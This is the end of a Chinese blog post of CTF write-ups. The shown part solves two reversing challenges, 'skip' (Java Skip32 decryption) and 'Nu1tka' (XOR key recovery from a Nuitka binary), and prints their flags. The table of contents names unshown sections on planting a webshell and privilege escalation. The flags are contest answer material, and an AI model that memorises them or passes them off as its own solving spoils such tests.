class="number">90</span>,<span class="number">43</span>,<span class="number">71</span>&#125;;</span><br><span class="line">    private static <span class="built_in">int</span> g(byte[] key, <span class="built_in">int</span> k, <span class="built_in">int</span> w) &#123;</span><br><span class="line">        <span class="built_in">int</span> g1, g2, g3, g4, g5, g6;</span><br><span class="line"></span><br><span class="line">        g1 = w &gt;&gt; <span class="number">8</span>;</span><br><span class="line">        g2 = w &amp; <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line">        g3 = FTABLE[g2 ^ (key[(<span class="number">4</span> * k) % <span class="number">8</span>] &amp; <span class="number">0xFF</span>)] ^ g1;</span><br><span class="line">        g4 = FTABLE[g3 ^ (key[(<span class="number">4</span> * k + <span class="number">1</span>) % <span class="number">8</span>] &amp; <span class="number">0xFF</span>)] ^ g2;</span><br><span class="line">        g5 = FTABLE[g4 ^ (key[(<span class="number">4</span> * k + <span class="number">2</span>) % <span class="number">8</span>] &amp; <span class="number">0xFF</span>)] ^ g3;</span><br><span class="line">        g6 = FTABLE[g5 ^ (key[(<span class="number">4</span> * k + <span class="number">3</span>) % <span class="number">8</span>] &amp; <span class="number">0xFF</span>)] ^ g4;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (g5 &lt;&lt; <span class="number">8</span>) + g6;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void skip32(byte[] key, <span class="built_in">int</span>[] buf, boolean encrypt) &#123;</span><br><span class="line">        <span class="built_in">int</span> k; /* <span class="built_in">round</span> number */</span><br><span class="line">        <span class="built_in">int</span> i; /* <span class="built_in">round</span> counter */</span><br><span class="line">        <span class="built_in">int</span> kstep;</span><br><span class="line">        <span class="built_in">int</span> wl, wr;</span><br><span class="line"></span><br><span class="line">        /* sort out direction */</span><br><span class="line">        <span class="keyword">if</span> (encrypt) &#123;</span><br><span class="line">            kstep = <span class="number">1</span>;</span><br><span class="line">            k = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            kstep = -<span class="number">1</span>;</span><br><span class="line">            k = <span class="number">23</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* pack into words */</span><br><span class="line">        wl = (buf[<span class="number">0</span>] &lt;&lt; <span class="number">8</span>) + buf[<span class="number">1</span>];</span><br><span class="line">        wr = (buf[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) + buf[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        /* <span class="number">24</span> feistel rounds, doubled up */</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">24</span> / <span class="number">2</span>; ++i) &#123;</span><br><span class="line">            wr ^= g(key, k, wl) ^ k;</span><br><span class="line">            k += kstep;</span><br><span class="line">            wl ^= g(key, k, wr) ^ k;</span><br><span class="line">            k += kstep;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /* implicitly swap halves <span class="keyword">while</span> unpacking */</span><br><span class="line">        buf[<span class="number">0</span>] = (wr &gt;&gt; <span class="number">8</span>);</span><br><span class="line">        buf[<span class="number">1</span>] = (wr &amp; <span class="number">0xFF</span>);</span><br><span class="line">        buf[<span class="number">2</span>] = (wl &gt;&gt; <span class="number">8</span>);</span><br><span class="line">        buf[<span class="number">3</span>] = (wl &amp; <span class="number">0xFF</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static <span class="built_in">int</span> encrypt(<span class="built_in">int</span> value, byte[] key) &#123;</span><br><span class="line">        <span class="built_in">int</span>[] buf = new <span class="built_in">int</span>[<span class="number">4</span>];</span><br><span class="line">        buf[<span class="number">0</span>] = ((value &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">        buf[<span class="number">1</span>] = ((value &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">        buf[<span class="number">2</span>] = ((value &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">        buf[<span class="number">3</span>] = ((value &gt;&gt; <span class="number">0</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line"></span><br><span class="line">        skip32(key, buf, true);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">int</span> out = ((buf[<span class="number">0</span>]) &lt;&lt; <span class="number">24</span>) | ((buf[<span class="number">1</span>]) &lt;&lt; <span class="number">16</span>) | ((buf[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">                | (buf[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static <span class="built_in">int</span> ddd(<span class="built_in">int</span> value, byte[] key) &#123;</span><br><span class="line">        <span class="built_in">int</span>[] buf = new <span class="built_in">int</span>[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">        buf[<span class="number">0</span>] = ((value &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">        buf[<span class="number">1</span>] = ((value &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">        buf[<span class="number">2</span>] = ((value &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">        buf[<span class="number">3</span>] = ((value &gt;&gt; <span class="number">0</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line"></span><br><span class="line">        skip32(key, buf, false);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">int</span> out = ((buf[<span class="number">0</span>]) &lt;&lt; <span class="number">24</span>) | ((buf[<span class="number">1</span>]) &lt;&lt; <span class="number">16</span>) | ((buf[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">                | (buf[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        byte[] key=<span class="string">&quot;7d77cfe8&quot;</span>.getBytes();</span><br><span class="line">        <span class="built_in">int</span>[] iArr=&#123;<span class="number">52</span>, <span class="number">142</span>, <span class="number">226</span>, <span class="number">172</span>, <span class="number">108</span>, <span class="number">94</span>, <span class="number">80</span>, <span class="number">51</span>, <span class="number">11</span>, <span class="number">251</span>, <span class="number">68</span>, <span class="number">164</span>, <span class="number">231</span>, <span class="number">6</span>, <span class="number">124</span>, <span class="number">223</span>, <span class="number">100</span>, <span class="number">62</span>, <span class="number">116</span>, <span class="number">70</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i+=<span class="number">4</span>)&#123;</span><br><span class="line">            <span class="built_in">int</span> value=(iArr[i]&lt;&lt;<span class="number">24</span>)|(iArr[i+<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(iArr[i+<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|(iArr[i+<span class="number">3</span>]);</span><br><span class="line">            value=ddd(value,key);</span><br><span class="line">            iArr[i]=((value &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">            iArr[i+<span class="number">1</span>] =((value &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">            iArr[i+<span class="number">2</span>] = ((value &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">            iArr[i+<span class="number">3</span>] = ((value) &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        StringBuilder sb = new StringBuilder();</span><br><span class="line"></span><br><span class="line">        // 遍历 ASCII 值数组，将每个值转换为字符并添加到 StringBuilder</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> value : iArr) &#123;</span><br><span class="line">            sb.append((char) value);  // 将 ASCII 值转换为字符</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(sb.toString());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用户名和密码拼接就是flag</p>
<p>flag{7d77cfe8c58b6a2f988bc9434a45}</p>
<h2 id="Nu1tka"><a href="#Nu1tka" class="headerlink" title="Nu1tka"></a>Nu1tka</h2><p><strong>[题目writeup]：</strong></p>
<a class="btn-beautify " target="_blank" rel="noopener" href="https://video.bbling.cc/wp%E6%98%A5%E7%A7%8B%E6%9D%AF2024/Nu1tka.zip" title="点击下载题文件"><span>点击下载题文件</span></a>

<p>ida64打开</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e55a3ef935.webp"></p>
<p>这里是个跳板程序，直接动调拿到ApplicationName</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e55c559f4b.webp"></p>
<p>去文件夹找到真正的程序</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e55de1e098.webp"></p>
<p>再用ida64打开</p>
<p>找到main字符串，交叉引用+动调找到main函数</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e55fc1d8ef.webp"></p>
<p>一直跟到输入</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e561ce5781.webp"></p>
<p>我们可以点进函数，看到是input，后面的一些函数也是点进去，看看报错信息或者提示字符串判断是什么函数</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e56331d35a.webp"></p>
<p>输入必须是40个字节</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e59d34ded8.webp" alt="640 (38)"></p>
<p>循环将输入转成ascii列表</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e5a210eb99.webp" alt="640 (39)"></p>
<figure class="highlight stan"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>.from_bytes(<span class="title">data</span>,<span class="string">&quot;little&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>转化成4字节数组</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e5a6a34c7d.webp" alt="640 (40)"></p>
<p><img src="https://bu.dusays.com/2025/01/20/678e5a76b090a.webp" alt="640 (41)"></p>
<p>这里存放了两个数组，跟到后面可以发现分别是key和密文</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e5a8563d81.webp" alt="640 (42)"></p>
<p>输入和key进行了异或，然后和密文进行比较</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e5a941a185.webp" alt="640 (43)"></p>
<p>提取出密文和key异或就能得到flag，这里得注意python存放数据uint32是以30bit为单位的，需要自己转化一下，才能得到正确的数据</p>
<p>详细参考longintrepr.h</p>
<p><img src="https://bu.dusays.com/2025/01/20/678e5aa5878b0.webp" alt="640 (44)"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">key</span>=[<span class="number">0</span>xf5138033,<span class="number">0</span>x985a0194,<span class="number">0</span>xb4c41b8f,<span class="number">0</span>x8b1e6089,<span class="number">0</span>x8db7419b,<span class="number">0</span>xdc6873f3,<span class="number">0</span>x849faa92,<span class="number">0</span>xb0d6b47e,<span class="number">0</span>xa3ad4395,<span class="number">0</span>xb3ea34c7]</span><br><span class="line"><span class="attribute">enc</span>=[<span class="number">0</span>x9272ec55,<span class="number">0</span>xa86f64ef,<span class="number">0</span>x8ca02ded,<span class="number">0</span>xba2a4def,<span class="number">0</span>xe99a25fa,<span class="number">0</span>xf10b4bc2,<span class="number">0</span>xe2a89bf4,<span class="number">0</span>xd2e28553,<span class="number">0</span>x909920a3,<span class="number">0</span>xcedd52a6]</span><br><span class="line"><span class="attribute">for</span> i in range(len(enc)):</span><br><span class="line">    <span class="attribute">enc</span>[i]^=key[i]</span><br><span class="line"><span class="attribute">import</span> libnum</span><br><span class="line"><span class="attribute">for</span> i in enc:</span><br><span class="line">    <span class="attribute">print</span>(libnum.n2s(i).decode()[::-<span class="number">1</span>],end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>flag{e50b6d8f-41ad-d18c-f17f-14b6c43af7}</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://1.94.234.244">Linstars</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://1.94.234.244/2025/01/20/CTF2024%E6%98%A5%E7%A7%8B%E6%9D%AFWP%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/">http://1.94.234.244/2025/01/20/CTF2024%E6%98%A5%E7%A7%8B%E6%9D%AFWP%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://1.94.234.244" target="_blank">LinBlog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/01/20/windows%E5%91%BD%E4%BB%A4%E8%A1%8C/" title="windows命令行"><img class="cover" src="https://bu.dusays.com/2025/01/18/678bac2ab5af2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">windows命令行</div></div><div class="info-2"><div class="info-item-1">windows的很多命令行记不住，稍微总结一下吧</div></div></div></a><a class="pagination-related" href="/2025/01/18/web%E5%89%8D%E7%AB%AF%E5%90%88%E9%9B%86/" title="web前端合集"><img class="cover" src="https://bu.dusays.com/2025/01/18/678b9d68ca2d4.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">web前端合集</div></div><div class="info-2"><div class="info-item-1">来自黑马程序员的课程笔记</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2024/11/25/CTF%E7%AB%9E%E8%B5%9B/" title="CTF竞赛"><img class="cover" src="https://bu.dusays.com/2025/01/18/678bba34de0de.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-25</div><div class="info-item-2">CTF竞赛</div></div><div class="info-2"><div class="info-item-1">CTF是一种网络安全竞赛形式，主要通过解密、逆向工程、网络攻击、隐写术等方式解决各种网络安全挑战。CTF题型通常分为Jeopardy（解题型）和Attack-Defense（攻防型）两大类Jeopardy题目常见分类有Web、Crypto、Pwn、Reverse....</div></div></div></a><a class="pagination-related" href="/2025/01/02/ICMP%E6%B4%AA%E6%B0%B4%E6%95%B0%E6%8D%AE%E5%8C%85/" title="ICMP洪水数据包"><img class="cover" src="https://bu.dusays.com/2025/01/18/678bb07e5fd5f.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-02</div><div class="info-item-2">ICMP洪水数据包</div></div><div class="info-2"><div class="info-item-1">DDOS实现方法</div></div></div></a><a class="pagination-related" href="/2024/12/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8A%A0%E5%9B%BA/" title="数据库加固"><img class="cover" src="https://bu.dusays.com/2025/01/18/678bbd3f51e63.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-03</div><div class="info-item-2">数据库加固</div></div><div class="info-2"><div class="info-item-1">CTF加固数据的题目和实现方法</div></div></div></a><a class="pagination-related" href="/2024/12/03/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%BD%92%E6%A1%A3/" title="安全漏洞归档"><img class="cover" src="https://bu.dusays.com/2025/01/18/678bbf8e0ba6c.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-03</div><div class="info-item-2">安全漏洞归档</div></div><div class="info-2"><div class="info-item-1">归纳一下自己复现的漏洞，好多都没写。</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://bu.dusays.com/2024/12/14/675d102b421a9.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Linstars</div><div class="author-info-description">离目标越来越近</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/linstars"><i class="iconfont icon-github"></i><span>关注我</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/linstars" target="_blank" title="Github"><i class="iconfont icon-GitHub" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:3503460154@qq.com" target="_blank" title="Email"><i class="iconfont icon-email" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/506230312" target="_blank" title="Bilibili"><i class="iconfont icon-bilibili-fill" style="color: #fb7299;"></i></a><a class="social-icon" href="/images/img/wechat.jpg" target="_blank" title="wechat"><i class="iconfont icon-weixin" style="color: #28db70;"></i></a><a class="social-icon" href="tencent://message/?uin=757453794&amp;Site=&amp;Menu=yes" target="_blank" title="QQ"><i class="iconfont icon-qq" style="color: #19b4d9;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content"><center><b>---本站主域名---<br><a target="_blank" rel="noopener" href="https://bbling.cc">bbling.cc</a>&nbsp&nbsp||&nbsp&nbsp<a target="_blank" rel="noopener" href="https://bbling.cc">前往主域名</a><br>---本站其他域名---<br><a target="_blank" rel="noopener" href="https://blog.bbling.cc">blog.bbling.cc</a>&nbsp&nbsp||&nbsp&nbsp<a target="_blank" rel="noopener" href="https://blog.bbling.cc">点击前往</a></b><br><b><a target="_blank" rel="noopener" href="https://aaling.xin">aaling.xin</a>&nbsp&nbsp||&nbsp&nbsp<a target="_blank" rel="noopener" href="https://aaling.xin">点击前往</a></b></center></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#day1"><span class="toc-number">1.</span> <span class="toc-text">day1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#EzRSA"><span class="toc-number">1.1.</span> <span class="toc-text">EzRSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-vm"><span class="toc-number">1.2.</span> <span class="toc-text">ez_vm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezre"><span class="toc-number">1.3.</span> <span class="toc-text">ezre</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RSA1"><span class="toc-number">1.4.</span> <span class="toc-text">RSA1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gender-Simulation"><span class="toc-number">1.5.</span> <span class="toc-text">Gender_Simulation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gotar"><span class="toc-number">1.6.</span> <span class="toc-text">Gotar</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#day2"><span class="toc-number">2.</span> <span class="toc-text">day2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#python-jail"><span class="toc-number">2.1.</span> <span class="toc-text">python jail</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gofl-revenge"><span class="toc-number">2.2.</span> <span class="toc-text">gofl revenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#right-data"><span class="toc-number">2.3.</span> <span class="toc-text">right_data</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cpy"><span class="toc-number">2.4.</span> <span class="toc-text">cpy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-http"><span class="toc-number">2.5.</span> <span class="toc-text">easy_http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b0okshelf"><span class="toc-number">2.6.</span> <span class="toc-text">b0okshelf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.6.1.</span> <span class="toc-text">利用字符逃逸漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.6.2.</span> <span class="toc-text">写入一句话木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E9%99%90%E5%88%B6"><span class="toc-number">2.6.3.</span> <span class="toc-text">绕过安全限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">2.6.4.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mygo"><span class="toc-number">2.7.</span> <span class="toc-text">mygo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#factor"><span class="toc-number">2.8.</span> <span class="toc-text">factor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#skip"><span class="toc-number">2.9.</span> <span class="toc-text">skip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nu1tka"><span class="toc-number">2.10.</span> <span class="toc-text">Nu1tka</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div id="ft"><div class="ft-item-1"><div class="t-top"><div class="t-t-l"><p class="ft-t t-l-t">说点什么</p><div class="bg-ad"><div>（经过一下午的百般周折，也是成功将本网页从wordpress换成了hexo并部署到服务器，目前使用的宝塔搭配hexo静态仓库部署）</div><div class="btn-xz-box"><a class="btn-xz" href="/air-conditioner/">前往吹空调、聊天~</a></div></div></div><div class="t-t-r"><p class="ft-t t-l-t">修仙导航</p><ul class="ft-links"><li><a target="_blank" rel="noopener" href="https://bbling.cc/2024/12/02/hexo%E6%90%AD%E5%BB%BA/">建站指南</a><a target="_blank" rel="noopener" href="https://7bu.top/">推荐图床</a></li><li><a target="_blank" rel="noopener" href="https://fontawesome.com/">图标库</a><a target="_blank" rel="noopener" href="https://tinypng.com/">在线压缩图片</a></li><li><a target="_blank" rel="noopener" href="https://fontawesome.dashgame.com/">图标库2</a><a href="/archives/">文章归档</a></li><li><a href="/categories/">文章分类</a><a href="/tags/">文章标签</a></li><li><a target="_blank" rel="noopener" href="https://v6.51.la/">网站统计</a><a target="_blank" rel="noopener" href="https://www.bilibili.com/">我的追番</a></li><li><a href="/shuoshuo/">随手记</a><a href="/gallery/">一些壁纸</a></li></ul></div></div></div><div class="ft-item-2"><p class="ft-t">推荐友链</p><div class="ft-img-group"><div class="img-group-item"><a target="_blank" rel="noopener" href="https://cnhuazhu.top/butterfly/"><img src="https://bu.dusays.com/2024/12/22/6767ba6eb5ee2.jpg" alt="Hexo "/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://fomal.cc/"><img src="https://bu.dusays.com/2024/12/22/6767babe00d2e.jpg" alt="Fomalhaut🥝"/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://haiyong.site/"><img src="https://bu.dusays.com/2024/12/22/6767badb1aa03.png" alt="热于分享海拥"/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://razeen.me/"><img src="https://bu.dusays.com/2024/12/22/6767baf98eba7.png" alt="一位爱折腾的程序员。Razeen"/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://fe32.top/"><img src="https://bu.dusays.com/2022/05/02/626f92e193879.jpg" alt="唐志远"/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://android99.com/"><img src="https://android99.com/img/avatar.png" alt="边缘矩阵"/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://blog.captainz.cc/posts/hexo_butterfly_top_img.html"><img src="https://blog.captainz.cc/picture/0.webp" alt="闪闪发光的ZZZ"/></a></div><div class="img-group-item"><a target="_blank" rel="noopener" href="https://blog.anheyu.com/"><img src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg" alt="安知鱼"/></a></div></div></div></div><div class="copyright">&copy;2020 - 2025  <i id="heartbeat" class="fa fas fa-heartbeat"></i> Linstars</div><div class="footer_custom_text"><img src="/img/icp.png"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">豫ICP备2024063535号-1</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/node-snackbar/0.1.16/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
  const option = null

  const initValine = (el, path) => {
    if (isShuoshuo) {
      window.shuoshuoComment.destroyValine = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }

    const valineConfig = {
      el: '#vcomment',
      appId: '3eWZMlM9tT0NRgGJ577h51M1-gzGzoHsz',
      appKey: 'K8Eklo65nqNDps1YU0Q59ZrX',
      avatar: 'monsterid',
      serverURLs: 'bbling.cc',
      emojiMaps: "",
      visitor: false,
      ...option,
      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
    }

    new Valine(valineConfig)
  }

  const loadValine = async (el, path) => {
    if (typeof Valine === 'function') {
      initValine(el, path)
    } else {
      await btf.getScript('https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/valine/1.4.16/Valine.min.js')
      initValine(el, path)
    }
  }

  if (isShuoshuo) {
    'Valine' === 'Valine'
      ? window.shuoshuoComment = { loadComment: loadValine }
      : window.loadOtherComment = loadValine
    return
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script></div><script defer data-pjax src="/js/cat.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>